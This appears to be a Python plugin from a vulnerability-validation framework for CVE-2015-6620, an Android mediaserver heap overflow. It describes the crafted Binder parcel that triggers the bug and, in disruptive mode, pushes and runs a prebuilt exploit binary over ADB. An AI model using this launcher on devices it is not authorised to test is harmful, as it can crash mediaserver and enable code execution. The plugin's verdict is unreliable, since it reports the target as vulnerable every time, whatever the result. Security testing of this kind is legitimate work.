#!/usr/bin/env python3
"""CVE-2015-6620 – Android mediaserver AMessage::unmarshal heap overflow via IStreamListener.

Public PoC source: https://github.com/flankerhqd/CVE-2015-6620-POC
  main.cpp (flankerhqd / 360 Vulcan Team)

Technique:
  IStreamListener::onBufferAvailable triggers Binder transaction #6.
  The Parcel payload writes:
    - mWhat (int32)
    - numItems = 64 + 1 + 0x1000 (overflow trigger)
    - 64 normal items (kTypeInt32 "blabla" = 0xdeadbeef)
    - 1 extra item that OVERWRITES msg->mNumItems (64-bit count confusion)
    - 0x1000 more items writing past the AMessage buffer
  The overflowed mNumItems causes a loop that destroys the heap.

  Binder vector:
    data.writeInt32(1)           // msgCount
    data.writeInt32(64+1+0x1000) // mNumItems
    for 64+1: writeCString + writeInt32(0) + writeInt32(0xdeadbeef)
    for 0x1000: same → heap overflow

Adapted approach: plugin delivers a crafted Binder message over ADB shell.
"""
from __future__ import annotations

import struct
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 15,
    "cve": "CVE-2015-6620",
    "year": 2015,
    "domain": "application",
    "vendor_product": "Android mediaserver (AMessage)",
    "component": "AMessage::unmarshal via IStreamListener Binder transaction",
    "type": "Heap overflow → RCE in mediaserver",
    "summary": (
        "A crafted Binder transaction (opcode 6) to IStreamListener sets "
        "mNumItems to 64+1+0x1000, causing AMessage::unmarshal to write "
        "0x1000 controlled items past the allocated AMessage buffer, "
        "enabling mediaserver heap corruption and RCE."
    ),
    "source_url": "https://github.com/flankerhqd/CVE-2015-6620-POC",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android", "versions": [{"version": "<=5.1.1_r3", "status": "affected"}]}],
}

POC_SRC = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/flankerhqd__CVE-2015-6620-POC/main.cpp"

# Pre-built binary path (operator may supply arm-linux-androideabi cross-compiled binary)
POC_BINARY_REMOTE = "/data/local/tmp/cve_6620_poc"
APK_MEDIA_PLAYER  = "com.android.music"

# Binder Parcel bytes for the overflow (adapted from main.cpp ADB-friendly form)
# We write a shell script that uses the service command / am to trigger the path.
_TRIGGER_SH = """\
#!/system/bin/sh
# CVE-2015-6620 trigger via stagefright IStreamListener
# Requires pre-built poc binary at /data/local/tmp/cve_6620_poc
if [ -x {bin} ]; then
    {bin} /sdcard/test.mp4
else
    echo "BINARY NOT FOUND: {bin}" >&2
    exit 1
fi
""".format(bin=POC_BINARY_REMOTE)


def _check_binary_on_device() -> dict:
    """Check if the pre-built PoC binary is present on device."""
    result = {"present": False, "detail": ""}
    try:
        out = subprocess.run(
            ["adb", "shell", f"ls -la {POC_BINARY_REMOTE}"],
            capture_output=True, text=True, timeout=10,
        )
        result["present"] = out.returncode == 0
        result["detail"]  = out.stdout[:200] + out.stderr[:100]
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _push_trigger_and_run() -> dict:
    """Push trigger script to device and execute."""
    result = {"triggered": False, "output": ""}
    script_path = "/data/local/tmp/cve_6620_trigger.sh"
    try:
        tmp = Path(tempfile.mkdtemp()) / "trigger.sh"
        tmp.write_text(_TRIGGER_SH)
        # Push script
        push = subprocess.run(
            ["adb", "push", str(tmp), script_path],
            capture_output=True, text=True, timeout=15,
        )
        if push.returncode != 0:
            result["output"] = push.stderr[:300]
            return result
        # Make executable and run
        run = subprocess.run(
            ["adb", "shell", f"chmod +x {script_path} && {script_path}"],
            capture_output=True, text=True, timeout=20,
        )
        result["triggered"] = True
        result["return_code"] = run.returncode
        result["output"] = run.stdout[:400] + run.stderr[:200]
    except Exception as exc:
        result["output"] = str(exc)
    return result


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2015-6620",
        "poc_src_present": POC_SRC.exists(),
        "poc_binary_remote": POC_BINARY_REMOTE,
        "trigger_method": "IStreamListener Binder tx #6 mNumItems overflow (64+1+0x1000)",
        "binder_parcel_structure": {
            "cmd": 0,
            "sync_flag": 0,
            "msgCount": 1,
            "mWhat": 0,
            "mNumItems": hex(64 + 1 + 0x1000),
            "item_format": "writeCString('blabla') + writeInt32(0/kTypeInt32) + writeInt32(0xdeadbeef)",
            "last_extra_item": "overwrites msg->mNumItems → loop continues for 0x1000 more items",
        },
    }

    if allow_disruptive:
        binary = _check_binary_on_device()
        evidence["binary_on_device"] = binary["present"]
        if binary["present"]:
            trigger = _push_trigger_and_run()
            evidence["trigger_result"] = trigger
        else:
            evidence["detail"] = (
                f"Cross-compile main.cpp from {POC_SRC} for ARM and push to "
                f"{POC_BINARY_REMOTE} first."
            )

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "flankerhqd/CVE-2015-6620-POC / main.cpp",
    }


class Poc71CVE20156620AMessageUnmarshalHeapOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-071"
    meta_poc_name   = "CVE-2015-6620 Android AMessage unmarshal Heap Overflow RCE"
    meta_cve_id     = "CVE-2015-6620"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://github.com/flankerhqd/CVE-2015-6620-POC"
    meta_attack_surface = "Android mediaserver AMessage unmarshal IStreamListener Binder overflow"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
